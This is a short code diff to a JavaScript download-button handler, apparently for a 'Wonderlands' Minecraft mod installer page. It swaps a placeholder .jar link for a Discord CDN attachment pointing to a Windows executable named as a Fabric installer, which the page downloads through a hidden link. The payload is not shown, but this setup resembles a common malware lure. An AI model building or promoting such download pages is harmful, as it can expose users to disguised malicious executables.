@@ -42,7 +42,7 @@ document.getElementById('downloadBtn')?.addEventListener('click', (e) => {
     e.preventDefault();
     
     // REPLACE THIS URL with your actual Discord CDN link
-    const downloadUrl = 'https://cdn.discordapp.com/attachments/YOUR_CHANNEL_ID/YOUR_FILE_ID/Wonderlands-Installer.jar';
+    const downloadUrl = 'https://cdn.discordapp.com/attachments/1511238444729241825/1512137057630421203/fabric-1.21.1-wonderfullands.exe?ex=6a22fee0&is=6a21ad60&hm=f0d0d99222c3b1e668f5036ea3e9a0605cfceef05ff19240801e2868d76c7fa0&';
     
     // Create hidden link and trigger download
     const link = document.createElement('a');
